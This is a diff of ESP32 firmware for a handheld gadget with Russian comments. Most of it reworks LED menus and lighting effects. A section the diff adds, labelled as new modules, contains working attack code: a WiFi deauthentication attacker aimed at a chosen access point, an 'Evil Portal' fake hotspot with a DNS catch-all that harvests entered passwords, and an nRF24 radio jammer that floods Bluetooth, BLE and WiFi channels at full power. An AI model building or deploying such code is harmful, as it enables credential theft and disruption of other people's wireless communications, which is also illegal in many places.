 
-  int y1 = 20; // строка "Color"
-  int y2 = 40; // строка "Brightness"
-  int startX = 30;
-  int textX = 45;
+    int visible = 4;
+    int total = numColors;
+    int offset = 0;
+    if (colorIdx >= visible) offset = colorIdx - visible + 1;
+    if (offset < 0) offset = 0;
+    if (offset + visible > total) offset = total - visible;
+    if (offset < 0) offset = 0;
 
-  // Пункт "Color"
-  if (led_color_edit_mode && led_editing_param == 0) {
-    display.fillRect(textX - 2, y1 - 1, 80, 12, SSD1306_WHITE);
-    display.setTextColor(SSD1306_BLACK);
-    display.setCursor(startX, y1);
-    display.print(">");
-  } else {
-    display.setTextColor(SSD1306_WHITE);
-    if (led_submenu_idx == 0) {
-      display.setCursor(startX, y1);
-      display.print(">");
+    for (int i = 0; i < visible; i++) {
+        int idx = offset + i;
+        if (idx >= total) break;
+        char label[10];
+        sprintf(label, "%d", idx + 1);
+        int y = 16 + i * 11;
+        if (idx == colorIdx) {
+            display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
+            display.setTextColor(SSD1306_BLACK);
+            display.setCursor(4, y);
+            display.print(">");
+        } else {
+            display.setTextColor(SSD1306_WHITE);
+        }
+        display.setCursor(14, y);
+        display.print(label);
+        display.fillRect(50, y, 10, 8, colorPalette[idx]);
     }
-  }
-  display.setCursor(textX, y1);
-  display.print("Color: ");
-  // Образец цвета
-  uint32_t col = colorPalette[colorIdx];
-  display.fillRect(100, y1 - 2, 20, 12, SSD1306_BLACK);
-  display.fillRect(100, y1 - 2, 20, 12, col);
 
-  // Пункт "Brightness"
-  if (led_color_edit_mode && led_editing_param == 1) {
-    display.fillRect(textX - 2, y2 - 1, 80, 12, SSD1306_WHITE);
-    display.setTextColor(SSD1306_BLACK);
-    display.setCursor(startX, y2);
-    display.print(">");
-  } else {
-    display.setTextColor(SSD1306_WHITE);
-    if (led_submenu_idx == 1) {
-      display.setCursor(startX, y2);
-      display.print(">");
-    }
-  }
-  display.setCursor(textX, y2);
-  display.print("Bright: ");
-  display.print(brightness);
+    display.setCursor(2, 56);
+    if (offset > 0) display.print("▲ ");
+    else display.print("  ");
+    display.print(offset + 1);
+    display.print("/");
+    display.print(total);
+    if (offset + visible < total) display.print(" ▼");
+    else display.print("  ");
 
-  // Подсказка
-  display.setTextColor(SSD1306_WHITE);
-  display.setCursor(10, 56);
-  if (led_color_edit_mode) {
-    display.print("UP/DOWN=change  OK=save");
-  } else {
-    display.print("OK=edit  UP/DOWN=select");
-  }
-
-  drawTopBarIcons();
-  display.display();
+    drawTopBarIcons();
+    display.display();
 }
 void drawLedEffectMenu() {
-  display.clearDisplay();
-  drawHeader("Select Effect");
+    display.clearDisplay();
+    drawHeader("Select Effect");
+    int effectIdx = led_selected_device ? led_keyboard_effect : led_board_effect;
+    int total = numEffects;
+    int visible = 4;
+    int offset = 0;
+    if (effectIdx >= visible) offset = effectIdx - visible + 1;
+    if (offset < 0) offset = 0;
+    if (offset + visible > total) offset = total - visible;
+    if (offset < 0) offset = 0;
 
-  int effectIdx = led_selected_device ? led_keyboard_effect : led_board_effect;
-  int totalEffects = numEffects;
-
-  int groupStart = (effectIdx / 4) * 4;
-  if (groupStart >= totalEffects) groupStart = 0;
-
-  int visible = 0;
-  for (int i = 0; i < 4; i++) {
-    int idx = groupStart + i;
-    if (idx >= totalEffects) break;
-    int y = 20 + i * 12;
-    int startX = 30;
-    int textX = 45;
-
-    if (idx == effectIdx) {
-      int16_t x1, y1;
-      uint16_t w, h;
-      display.getTextBounds(effectNames[idx], 0, 0, &x1, &y1, &w, &h);
-      display.fillRect(textX - 2, y - 1, w + 18, h + 2, SSD1306_WHITE);
-      display.setTextColor(SSD1306_BLACK);
-      display.setCursor(startX, y);
-      display.print(">");
-    } else {
-      display.setTextColor(SSD1306_WHITE);
+    for (int i = 0; i < visible; i++) {
+        int idx = offset + i;
+        if (idx >= total) break;
+        int y = 16 + i * 11;
+        if (idx == effectIdx) {
+            display.fillRect(0, y - 1, SCREEN_WIDTH, 10, SSD1306_WHITE);
+            display.setTextColor(SSD1306_BLACK);
+            display.setCursor(4, y);
+            display.print(">");
+        } else {
+            display.setTextColor(SSD1306_WHITE);
+        }
+        display.setCursor(14, y);
+        display.print(effectNames[idx]);
     }
-    display.setCursor(textX, y);
-    display.print(effectNames[idx]);
-    visible++;
-  }
 
-  if (visible == 0) {
-    display.setCursor(30, 30);
-    display.print("No effects");
-  }
+    display.setCursor(2, 56);
+    if (offset > 0) display.print("▲ ");
+    else display.print("  ");
+    display.print(offset + 1);
+    display.print("/");
+    display.print(total);
+    if (offset + visible < total) display.print(" ▼");
+    else display.print("  ");
 
-  // Индикаторы прокрутки
-  if (groupStart + 4 < totalEffects) {
-    display.drawLine(SCREEN_WIDTH - 5, 40, SCREEN_WIDTH - 5, 50, SSD1306_WHITE);
-    display.drawLine(SCREEN_WIDTH - 3, 43, SCREEN_WIDTH - 7, 43, SSD1306_WHITE);
-  }
-  if (groupStart > 0) {
-    display.drawLine(SCREEN_WIDTH - 5, 20, SCREEN_WIDTH - 5, 30, SSD1306_WHITE);
-    display.drawLine(SCREEN_WIDTH - 3, 27, SCREEN_WIDTH - 7, 27, SSD1306_WHITE);
-  }
-
-  drawTopBarIcons();
-  display.display();
+    drawTopBarIcons();
+    display.display();
 }
-void drawLedDeviceMenu() {
-  display.clearDisplay();
-  drawHeader(led_selected_device == 0 ? "Board LED" : "Keyboard LED");
-  const char* items[] = {"Color", "Effect", "Timeout", "Back"};
-  for (int i = 0; i < 4; i++) {
-    drawItem(items[i], i == led_device_menu_idx, i);
-  }
-  drawTopBarIcons();
-  display.display();
-}
+void drawLedBrightnessMenu() {
+    display.clearDisplay();
+    drawHeader("Brightness");
+    int brightness = led_selected_device ? led_keyboard_brightness : led_board_brightness;
+    display.setCursor(10, 25);
+    display.print("Brightness: ");
+    display.print(brightness);
+    display.print("%");
 
-void drawLedColor() {
-  display.clearDisplay();
-  drawHeader("LED Color");
-  int color = (led_selected_device == 0) ? led_board_colorIdx : led_keyboard_colorIdx;
-  int brightness = (led_selected_device == 0) ? led_board_brightness : led_keyboard_brightness;
-  display.setCursor(10, 25);
-  display.print("Color: ");
-  display.print(color);
-  display.setCursor(10, 40);
-  display.print("Brightness: ");
-  display.print(brightness);
-  display.setCursor(2, 56);
-  display.print("UP/DOWN=Change  OK=Save");
-  drawTopBarIcons();
-  display.display();
-}
+    display.drawRect(10, 40, 108, 8, SSD1306_WHITE);
+    display.fillRect(10, 40, map(brightness, 0, 100, 0, 108), 8, SSD1306_WHITE);
 
-void drawLedEffect() {
-  display.clearDisplay();
-  drawHeader("LED Effect");
-  int effect = (led_selected_device == 0) ? led_board_effect : led_keyboard_effect;
-  display.setCursor(10, 25);
-  display.print("Effect: ");
-  display.print(effect);
-  display.setCursor(2, 56);
-  display.print("UP/DOWN=Change  OK=Save");
-  drawTopBarIcons();
-  display.display();
+    display.setCursor(2, 56);
+    display.print("UP/DOWN=Change  OK=Save");
+    drawTopBarIcons();
+    display.display();
 }
-
-void drawLedTimeout() {
-  display.clearDisplay();
-  drawHeader("LED Timeout");
-  int timeout = (led_selected_device == 0) ? led_board_timeout : led_keyboard_timeout;
-  display.setCursor(10, 25);
-  display.print("Timeout: ");
-  if (timeout == 0) display.print("Always");
-  else display.print(timeout);
-  display.print(" sec");
-  display.setCursor(2, 56);
-  display.print("UP/DOWN=Change  OK=Save");
-  drawTopBarIcons();
-  display.display();
-}
-
-void drawLedMenu() {
-  display.clearDisplay();
-  drawHeader("LED Control");
-  const char* items[] = {"Color", "Effect", "Timeout", "Back"};
-  const int LED_MENU_SIZE = 4;
-  for (int i = 0; i < LED_MENU_SIZE; i++) {
-    drawItem(items[i], i == led_device_menu_idx, i);
-  }
-  drawTopBarIcons();
-  display.display();
+void drawLedTimeoutMenu() {
+    display.clearDisplay();
+    drawHeader("Timeout");
+    int timeout = led_selected_device ? led_keyboard_timeout : led_board_timeout;
+    display.setCursor(10, 25);
+    display.print("Timeout: ");
+    if (timeout == 0) display.print("Always");
+    else {
+        display.print(timeout);
+        display.print(" sec");
+    }
+    display.setCursor(2, 56);
+    display.print("UP/DOWN=Change  OK=Save");
+    drawTopBarIcons();
+    display.display();
 }
 
 void updateLedBoard() {
-  static unsigned long lastUpdate = 0;
-  if (led_board_timeout > 0 && (millis() - lastLedActivity) > (led_board_timeout * 1000UL)) {
-    led_board.clear(); led_board.show(); return;
-  }
-  if (millis() - lastUpdate < 50) return;
-  lastUpdate = millis();
-  uint32_t color = 0;
-  if (led_board_colorIdx == 0) {
-    led_board.clear(); led_board.show(); return;
-  }
-  if (led_board_colorIdx > 0 && led_board_colorIdx < numColors) {
-    color = colorPalette[led_board_colorIdx];
-  } else {
-    color = 0;
-  }
-  switch (led_board_effect) {
-  case 0: // Solid
-    led_board.setPixelColor(0, color);
-    led_board.show();
-    break;
-  case 1: // Blink
-    if ((millis() / 500) % 2) led_board.setPixelColor(0, color);
-    else led_board.clear();
-    led_board.show();
-    break;
-  case 2: // Fade
-    {
-      int bright = (sin(millis() * 0.003) + 1) * 127;
-      led_board.setPixelColor(0, color);
-      led_board.setBrightness(bright);
-      led_board.show();
-      led_board.setBrightness(led_board_brightness);
-    }
-    break;
-  case 3: // Rainbow
-    {
-      int hue = (millis() / 50) % 360;
-      uint32_t rgb = led_board.ColorHSV(hue * 182, 255, led_board_brightness);
-      led_board.setPixelColor(0, rgb);
-      led_board.show();
-    }
-    break;
-  default: // для всех остальных эффектов – статика
-    led_board.setPixelColor(0, color);
-    led_board.show();
-    break;
-}
-  switch (led_board_effect) {
-    case 0:
-      led_board.setPixelColor(0, color);
-      led_board.show();
-      break;
-    case 1:
-      if ((millis() / 500) % 2) led_board.setPixelColor(0, color);
-      else led_board.clear();
-      led_board.show();
-      break;
-    case 2: {
-        int bright = (sin(millis() * 0.003) + 1) * 127;
-        led_board.setPixelColor(0, color);
-        led_board.setBrightness(bright);
-        led_board.show();
-        led_board.setBrightness(led_board_brightness);
-      }
-      break;
-    case 3: {
-        int hue = (millis() / 50) % 360;
-        uint32_t rgb = led_board.ColorHSV(hue * 182, 255, led_board_brightness);
-        led_board.setPixelColor(0, rgb);
-        led_board.show();
-      }
-      break;
-  }
-}
+    static unsigned long lastUpdate = 0;
+    static unsigned long lastEffectTime = 0;
+    static int cube1Pos = 0, cube2Pos = 7;
+    static int cubeDir1 = 1, cubeDir2 = -1;
+    static int chaseStep = 0;
+    static bool strobeState = false;
+    static int hueOffset = 0;
 
+    if (led_board_timeout > 0 && (millis() - lastLedActivity) > (led_board_timeout * 1000UL)) {
+        led_board.clear();
+        led_board.show();
+        return;
+    }
+
+    if (millis() - lastUpdate < 30) return;
+    lastUpdate = millis();
+
+    uint32_t baseColor = 0;
+    if (led_board_colorIdx > 0 && led_board_colorIdx < numColors) {
+        baseColor = colorPalette[led_board_colorIdx];
+    } else {
+        baseColor = colorPalette[0];
+    }
+
+    uint8_t r = (baseColor >> 16) & 0xFF;
+    uint8_t g = (baseColor >> 8) & 0xFF;
+    uint8_t b = baseColor & 0xFF;
+    float bright = (float)led_board_brightness / 100.0;
+
+    switch (led_board_effect) {
+        case 0:
+            for (int i = 0; i < 8; i++) {
+                led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
+            }
+            led_board.show();
+            break;
+
+        case 1:
+        {
+            float breath = 0.5 + 0.5 * sin(millis() * 0.003);
+            uint8_t bri = breath * led_board_brightness;
+            for (int i = 0; i < 8; i++) {
+                led_board.setPixelColor(i, led_board.Color(
+                    r * bri / 100,
+                    g * bri / 100,
+                    b * bri / 100
+                ));
+            }
+            led_board.show();
+            break;
+        }
+
+        case 2:
+        {
+            hueOffset = (hueOffset + 1) % 360;
+            for (int i = 0; i < 8; i++) {
+                int hue = (hueOffset + i * 360 / 8) % 360;
+                uint32_t col = led_board.ColorHSV(hue * 182, 255, led_board_brightness * 255 / 100);
+                led_board.setPixelColor(i, col);
+            }
+            led_board.show();
+            break;
+        }
+
+        case 3:
+        {
+            if (millis() - lastEffectTime > 40) {
+                lastEffectTime = millis();
+                cube1Pos += cubeDir1;
+                cube2Pos += cubeDir2;
+                if (cube1Pos >= 7 || cube1Pos <= 0) cubeDir1 *= -1;
+                if (cube2Pos >= 7 || cube2Pos <= 0) cubeDir2 *= -1;
+                if (cube1Pos == cube2Pos) {
+                    cubeDir1 *= -1;
+                    cubeDir2 *= -1;
+                }
+            }
+            led_board.clear();
+            for (int i = 0; i < 2; i++) {
+                int p1 = cube1Pos + i;
+                if (p1 >= 0 && p1 < 8) led_board.setPixelColor(p1, led_board.Color(r * bright, g * bright, b * bright));
+                int p2 = cube2Pos + i;
+                if (p2 >= 0 && p2 < 8) led_board.setPixelColor(p2, led_board.Color(r * bright, g * bright, b * bright));
+            }
+            led_board.show();
+            break;
+        }
+
+        case 4:
+        {
+            if (millis() - lastEffectTime > 100) {
+                lastEffectTime = millis();
+                chaseStep = (chaseStep + 1) % 3;
+            }
+            for (int i = 0; i < 8; i++) {
+                if ((i + chaseStep) % 3 == 0) {
+                    led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
+                } else {
+                    led_board.setPixelColor(i, 0);
+                }
+            }
+            led_board.show();
+            break;
+        }
+
+        case 5:
+        {
+            if (millis() - lastEffectTime > 100) {
+                lastEffectTime = millis();
+                strobeState = !strobeState;
+            }
+            if (strobeState) {
+                for (int i = 0; i < 8; i++) {
+                    led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
+                }
+            } else {
+                led_board.clear();
+            }
+            led_board.show();
+            break;
+        }
+
+        default:
+            for (int i = 0; i < 8; i++) {
+                led_board.setPixelColor(i, led_board.Color(r * bright, g * bright, b * bright));
+            }
+            led_board.show();
+            break;
+    }
+}
 void updateLedKeyboard() {
   static unsigned long lastUpdate = 0;
+  static unsigned long lastEffectTime = 0;
+  static int hueOffset = 0;
+  static bool strobeState = false;
+
   if (led_keyboard_timeout > 0 && (millis() - lastLedActivity) > (led_keyboard_timeout * 1000UL)) {
-    led_keyboard.clear(); led_keyboard.show(); return;
+    led_keyboard.clear();
+    led_keyboard.show();
+    return;
   }
-  if (millis() - lastUpdate < 50) return;
+  if (millis() - lastUpdate < 30) return;
   lastUpdate = millis();
-  uint32_t color = 0;
-  if (led_keyboard_colorIdx == 0) {
-    led_keyboard.clear(); led_keyboard.show(); return;
-  }
+
+  uint32_t baseColor = 0;
   if (led_keyboard_colorIdx > 0 && led_keyboard_colorIdx < numColors) {
-    color = colorPalette[led_keyboard_colorIdx];
+    baseColor = colorPalette[led_keyboard_colorIdx];
+  } else {
+    baseColor = colorPalette[0];
   }
-  switch (led_board_effect) {
-  case 0: // Solid
-    led_board.setPixelColor(0, color);
-    led_board.show();
-    break;
-  case 1: // Blink
-    if ((millis() / 500) % 2) led_board.setPixelColor(0, color);
-    else led_board.clear();
-    led_board.show();
-    break;
-  case 2: // Fade
-    {
-      int bright = (sin(millis() * 0.003) + 1) * 127;
-      led_board.setPixelColor(0, color);
-      led_board.setBrightness(bright);
-      led_board.show();
-      led_board.setBrightness(led_board_brightness);
-    }
-    break;
-  case 3: // Rainbow
-    {
-      int hue = (millis() / 50) % 360;
-      uint32_t rgb = led_board.ColorHSV(hue * 182, 255, led_board_brightness);
-      led_board.setPixelColor(0, rgb);
-      led_board.show();
-    }
-    break;
-  default: // для всех остальных эффектов – статика
-    led_board.setPixelColor(0, color);
-    led_board.show();
-    break;
-}
+  uint8_t r = (baseColor >> 16) & 0xFF;
+  uint8_t g = (baseColor >> 8) & 0xFF;
+  uint8_t b = baseColor & 0xFF;
+  float bright = (float)led_keyboard_brightness / 100.0;
+
   switch (led_keyboard_effect) {
     case 0:
-      led_keyboard.setPixelColor(0, color);
+      led_keyboard.setPixelColor(0, led_keyboard.Color(r * bright, g * bright, b * bright));
       led_keyboard.show();
       break;
+
     case 1:
-      if ((millis() / 500) % 2) led_keyboard.setPixelColor(0, color);
-      else led_keyboard.clear();
+    {
+      float breath = 0.5 + 0.5 * sin(millis() * 0.003);
+      uint8_t bri = breath * led_keyboard_brightness;
+      led_keyboard.setPixelColor(0, led_keyboard.Color(r * bri / 100, g * bri / 100, b * bri / 100));
       led_keyboard.show();
       break;
-    case 2: {
-        int bright = (sin(millis() * 0.003) + 1) * 127;
-        led_keyboard.setPixelColor(0, color);
-        led_keyboard.setBrightness(bright);
-        led_keyboard.show();
-        led_keyboard.setBrightness(led_keyboard_brightness);
-      }
+    }
+
+    case 2:
+    {
+      hueOffset = (hueOffset + 1) % 360;
+      uint32_t col = led_keyboard.ColorHSV(hueOffset * 182, 255, led_keyboard_brightness * 255 / 100);
+      led_keyboard.setPixelColor(0, col);
+      led_keyboard.show();
       break;
-    case 3: {
-        int hue = (millis() / 50) % 360;
-        uint32_t rgb = led_keyboard.ColorHSV(hue * 182, 255, led_keyboard_brightness);
-        led_keyboard.setPixelColor(0, rgb);
-        led_keyboard.show();
+    }
+
+    case 3:
+    {
+      if (millis() - lastEffectTime > 100) {
+        lastEffectTime = millis();
+        strobeState = !strobeState;
       }
+      if (strobeState) {
+        led_keyboard.setPixelColor(0, led_keyboard.Color(r * bright, g * bright, b * bright));
+      } else {
+        led_keyboard.clear();
+      }
+      led_keyboard.show();
+      break;
+    }
+
+    default:
+      led_keyboard.setPixelColor(0, led_keyboard.Color(r * bright, g * bright, b * bright));
+      led_keyboard.show();
       break;
   }
 }
-
 void updateWifiSpectrum() {
   if (!wifiSpectrumActive) return;
   if (millis() - lastChanSwitch > 100) {
@@ -3768,7 +4373,6 @@ void updateWifiSpectrum() {
   for (int ch = 1; ch <= WIFI_CHANNELS; ch++)
     wifiSmooth[ch] = (wifiSmooth[ch] * 7 + wifiPackets[ch] * 3) / 10;
 }
-
 void updateNrfSpectrum() {
   if (!nrfOk) return;
   if (millis() - lastNrfScan < 10) return;
@@ -3820,9 +4424,6 @@ void updateNrfSpectrum() {
   needRedraw = true;
 }
 
-// ----------------------------------------------------------------------------
-// КОНСОЛЬНЫЕ РЕЖИМЫ info И def
-// ----------------------------------------------------------------------------
 void consoleInfoMode() {
   static bool btnProcessed = false;
   static unsigned long longPressStart = 0;
@@ -3864,7 +4465,6 @@ void consoleInfoMode() {
   drawTopBarIcons();
   display.display();
 }
-
 void consoleDevMode() {
   static unsigned long lastDraw = 0;
   static unsigned long devStartTime = 0;
@@ -3924,10 +4524,6 @@ void consoleDevMode() {
     codePos = 0;
   }
 }
-
-// ----------------------------------------------------------------------------
-// ОСНОВНОЙ ЦИКЛ КОНСОЛИ
-// ----------------------------------------------------------------------------
 void consoleLoop() {
   if (consoleMode == CONSOLE_INFO) {
     consoleInfoMode();
@@ -4001,9 +4597,346 @@ void consoleLoop() {
   if (!btnOk()) okProcessed = false;
 }
 
-// ----------------------------------------------------------------------------
-// ОБНОВЛЕНИЕ ДИСПЛЕЯ (ГЛАВНЫЙ ДИСПЕТЧЕР)
-// ----------------------------------------------------------------------------
+// ======================================================================
+// НОВЫЕ МОДУЛИ (DEAUTHER, EVIL PORTAL, NRF ENHANCED JAMMER)
+// ======================================================================
+
+// ---- DEAUTHER ----
+static unsigned long deauthPacketCount = 0;
+static unsigned long deauthStartTime = 0;
+
+void runDeauther() {
+  if (wifiList.empty()) {
+    showMsg("Scan WiFi first");
+    return;
+  }
+  if (wifiSelectedIdx < 0 || wifiSelectedIdx >= (int)wifiList.size()) {
+    wifiSelectedIdx = 0;
+  }
+  targetChan = wifiList[wifiSelectedIdx].channel;
+  memcpy(targetBSSID, wifiList[wifiSelectedIdx].bssid, 6);
+  deauthActive = true;
+  deauthPacketCount = 0;
+  deauthStartTime = millis();
+  appState = STATE_DEAUTHER;
+  needRedraw = true;
+  showMsg("Deauther started");
+}
+
+void drawDeautherStatus() {
+  display.clearDisplay();
+  drawHeader("Deauther");
+  display.setCursor(2, 14);
+  display.print("Status: ON");
+  display.setCursor(2, 24);
+  display.print("Packets: " + String(deauthPacketCount));
+  display.setCursor(2, 34);
+  unsigned long elapsed = (millis() - deauthStartTime) / 1000;
+  display.print("Time: " + String(elapsed) + "s");
+  display.setCursor(2, 44);
+  display.print("OK=stop");
+  drawTopBarIcons();
+  display.display();
+  if (btnOk()) {
+    deauthActive = false;
+    appState = STATE_WIFI_MENU;
+    needRedraw = true;
+    showMsg("Deauther stopped");
+    return;
+  }
+  if (deauthActive && targetChan != 0) {
+    if (millis() - lastDeauthTime > 100) {
+      sendDeauth();
+      lastDeauthTime = millis();
+      deauthPacketCount++;
+      needRedraw = true;
+    }
+  }
+}
+
+// ---- EVIL PORTAL ----
+static DNSServer evilDns;
+static AsyncWebServer evilWeb(80);
+static String evilHtml = "";
+static bool evilPortalRunning = false;
+static int evilCreds = 0;
+static String evilLastCred = "";
+static IPAddress evilAPIP;
+
+class EvilPortalHandler : public AsyncWebHandler {
+public:
+  virtual bool canHandle(AsyncWebServerRequest *request) { return true; }
+  virtual void handleRequest(AsyncWebServerRequest *request) {
+    if (request->url() == "/" || request->url() == "/index.html") {
+      if (evilHtml.isEmpty()) {
+evilHtml = "<html><body><h1>WiFi Portal</h1>"
+           "<form action='/post' method='POST'>"
+           "Email: <input name='email'><br>"
+           "Password: <input name='password' type='password'><br>"
+           "<input type='submit'>"
+           "</form></body></html>";
+      }
+      request->send(200, "text/html", evilHtml);
+    } else if (request->url() == "/post") {
+      String ssid = request->arg("ssid");
+      String pass = request->arg("pass");
+      if (!ssid.isEmpty() && !pass.isEmpty()) {
+        evilCreds++;
+        evilLastCred = "SSID: " + ssid + " PASS: " + pass;
+        saveWiFiCredentials(ssid, pass);
+      }
+      request->send(200, "text/html", "<html><body><h2>Thanks!</h2><script>setTimeout(()=>{location='/';},2000);</script></body></html>");
+    } else {
+      request->redirect("/");
+    }
+  }
+};
+
+void runEvilPortal() {
+  if (evilPortalRunning) { showMsg("Already running"); return; }
+  String ssid = inputStringWithKeyboard(true, "AP SSID:");
+  if (ssid.isEmpty()) ssid = "FreeWiFi";
+  WiFi.mode(WIFI_AP);
+  WiFi.softAP(ssid.c_str());
+  evilAPIP = WiFi.softAPIP();
+  evilDns.start(53, "*", evilAPIP);
+  evilWeb.addHandler(new EvilPortalHandler()).setFilter(ON_AP_FILTER);
+  evilWeb.begin();
+  evilPortalRunning = true;
+  appState = STATE_EVIL_PORTAL;
+  needRedraw = true;
+  showMsg("Portal started");
+}
+
+void drawEvilPortalStatus() {
+  display.clearDisplay();
+  drawHeader("Evil Portal");
+  display.setCursor(2, 14);
+  display.print("Status: Running");
+  display.setCursor(2, 24);
+  display.print("SSID: " + String(WiFi.softAPSSID()));
+  display.setCursor(2, 34);
+  display.print("IP: " + evilAPIP.toString());
+  display.setCursor(2, 44);
+  display.print("Creds: " + String(evilCreds));
+  display.setCursor(2, 54);
+  display.print("OK=stop");
+  drawTopBarIcons();
+  display.display();
+  evilDns.processNextRequest();
+  if (btnOk()) {
+    evilWeb.end();
+    evilDns.stop();
+    WiFi.softAPdisconnect(true);
+    evilPortalRunning = false;
+    appState = STATE_WIFI_MENU;
+    needRedraw = true;
+    showMsg("Portal stopped");
+  }
+}
+
+// ---- NRF24 ENHANCED JAMMER ----
+static unsigned long jamPacketCount = 0;
+static unsigned long jamStartTime = 0;
+static int jamMode = 1; // 0 - BLE, 1 - BT
+
+// -------------------------------------------------------------
+// NRF ENHANCED JAMMER (исправленная версия)
+// -------------------------------------------------------------
+
+// -------------------------------------------------------------
+// NRF ENHANCED JAMMER (на основе вашего рабочего кода)
+// -------------------------------------------------------------
+
+// =====================================================
+// NRF ENHANCED JAMMER (пакетный метод, как в оригинале)
+// =====================================================
+void runNrfEnhancedJammer() {
+    if (!nrfOk) {
+        showMsg("nRF24 not found");
+        return;
+    }
+
+    const char* modes[] = {"BLE", "BT Classic", "Full 2.4GHz", "WiFi"};
+    int mode = 1; // BT по умолчанию
+
+    // === ВЫБОР РЕЖИМА ===
+    while (true) {
+        display.clearDisplay();
+        drawHeader("NRF Enhanced Jammer");
+        display.setCursor(10, 20);
+        display.print("Mode: ");
+        display.println(modes[mode]);
+        display.setCursor(10, 35);
+        display.println("UP/DOWN - change mode");
+        display.setCursor(10, 50);
+        display.println("OK - START jamming");
+        display.display();
+
+        Button btn = readButton();
+        
+        if (btn == BTN_UP)   { mode = (mode + 1) % 4; delay(200); }
+        if (btn == BTN_DOWN) { mode = (mode + 3) % 4; delay(200); }
+        
+        if (btn == BTN_OK) {
+            // Ждём, пока пользователь отпустит кнопку
+            while (readButton() == BTN_OK) delay(10);
+            delay(150);   // небольшая пауза
+            break;
+        }
+        delay(50);
+    }
+
+    // === НАСТРОЙКА КАНАЛОВ ===
+    uint8_t channels[128];
+    int chCount = 0;
+    switch (mode) {
+        case 0: // BLE
+            chCount = 3;
+            channels[0] = 37; channels[1] = 38; channels[2] = 39;
+            break;
+        case 1: // BT
+            chCount = 80;
+            for (int i = 0; i < 80; i++) channels[i] = i;
+            break;
+        case 2: // Full
+            chCount = 125;
+            for (int i = 0; i < 125; i++) channels[i] = i;
+            break;
+        case 3: // WiFi
+            chCount = 14;
+            int wifiCh[] = {12,17,22,27,32,37,42,47,52,57,62,67,72,84};
+            memcpy(channels, wifiCh, sizeof(wifiCh));
+            break;
+    }
+
+    // === ИНИЦИАЛИЗАЦИЯ РАДИО ===
+    radio.powerUp();
+    radio.stopListening();
+    radio.setPALevel(RF24_PA_MAX, true);
+    radio.setDataRate(RF24_2MBPS);
+    radio.setAutoAck(false);
+    radio.disableCRC();
+    radio.setRetries(0, 0);
+    radio.setAddressWidth(3);
+    radio.setPayloadSize(32);
+    radio.disableDynamicPayloads();
+    radio.flush_tx();
+
+    uint8_t payload[32];
+    memset(payload, 0xFF, 32); // шум
+
+    jamming = true;
+    jamStartTime = millis();
+    jamPacketCount = 0;
+    int chIndex = 0;
+    unsigned long lastStatus = 0;
+
+    // === ОСНОВНОЙ ЦИКЛ ДЖАММЕРА ===
+    while (true) {
+        Button btn = readButton();
+        
+        if (btn == BTN_OK) {
+            while (readButton() == BTN_OK) delay(10); // ждём отпускания
+            break;
+        }
+        if (longPressDetected) break;
+
+        radio.setChannel(channels[chIndex]);
+
+        // Мощный спам
+        for (int i = 0; i < 12; i++) {
+            radio.writeFast(payload, 32, true);
+        }
+        radio.txStandBy(0);
+
+        jamPacketCount += 12;
+        chIndex = (chIndex + 1) % chCount;
+
+        // Обновление экрана
+        if (millis() - lastStatus > 300) {
+            drawNrfEnhancedStatus(mode, channels[chIndex]);
+            lastStatus = millis();
+        }
+
+        delayMicroseconds(120);
+    }
+
+    // === ЗАВЕРШЕНИЕ ===
+    radio.flush_tx();
+    radio.powerDown();
+    jamming = false;
+    showMsg("Jammer stopped");
+}
+
+// =====================================================
+// ОТОБРАЖЕНИЕ СТАТУСА ДЖАММЕРА
+// =====================================================
+void drawNrfEnhancedStatus(int mode, int ch) {
+    display.clearDisplay();
+    drawHeader("NRF Jammer");
+    display.setCursor(2, 14);
+    display.print("Status: " + String(jamming ? "ON" : "OFF"));
+    display.setCursor(2, 24);
+    const char* modes[] = {"BLE", "BT", "Full", "WiFi"};
+    display.print("Mode: " + String(modes[mode]));
+    display.setCursor(2, 34);
+    display.print("Packets: " + String(jamPacketCount));
+    display.setCursor(2, 44);
+    unsigned long elapsed = (millis() - jamStartTime) / 1000;
+    display.print("Time: " + String(elapsed) + "s");
+    display.setCursor(2, 54);
+    display.print("OK to stop");
+    drawTopBarIcons();
+    display.display();
+}
+// ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
+String macToString(uint8_t* mac) {
+  char buf[18];
+  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+  return String(buf);
+}
+void stringToMAC(const char* str, uint8_t* mac) {
+  sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X", &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
+}
+String ipToString(uint8_t* ip) {
+  return String(ip[0])+"."+String(ip[1])+"."+String(ip[2])+"."+String(ip[3]);
+}
+void displayError(const char* msg, bool wait) { showMsg(msg); if(wait) delay(2000); }
+void displaySuccess(const char* msg, bool wait) { showMsg(msg); if(wait) delay(2000); }
+void drawMainBorderWithTitle(const char* title) { drawHeader(title); }
+void padprintln(const char* str) { display.println(str); }
+void printFootnote(const char* str) { display.setCursor(0, 56); display.print(str); }
+void wifiDisconnect() { WiFi.disconnect(true); }
+
+void performBleScan() {
+    bleDevices.clear();
+    bleSelectedIdx = 0;
+    bleScrollOffset = 0;
+    showMsg("Scanning...");
+    BLEScan* pBLEScan = BLEDevice::getScan();
+    pBLEScan->setActiveScan(true);
+    pBLEScan->setInterval(100);
+    pBLEScan->setWindow(99);
+    BLEScanResults foundDevices = pBLEScan->start(5, false);
+    int count = foundDevices.getCount();
+    for (int i = 0; i < count; i++) {
+        BLEAdvertisedDevice device = foundDevices.getDevice(i);
+        BLEDeviceInfo info;
+        info.name = String(device.getName().c_str());
+        info.address = String(device.getAddress().toString().c_str());
+        info.rssi = device.getRSSI();
+        bleDevices.push_back(info);
+    }
+    pBLEScan->clearResults();
+    showMsg("Scan complete");
+}
+
+
+
+
+
+// ==================== updateDisplay (исправлен) ====================
 void updateDisplay() {
   if (!displayOn) return;
   if (statusMsg != "" && millis() - statusMsgTime < 1500) {
@@ -4024,6 +4957,7 @@ void updateDisplay() {
       display.setCursor(20, 28);
       display.println(statusMsg);
     }
+    handleButtons();
     drawTopBarIcons();
     display.display();
     return;
@@ -4054,18 +4988,18 @@ void updateDisplay() {
     return;
   }
   switch (appState) {
-    case STATE_BADUSB_MENU: drawBadUsbMenu(); break;
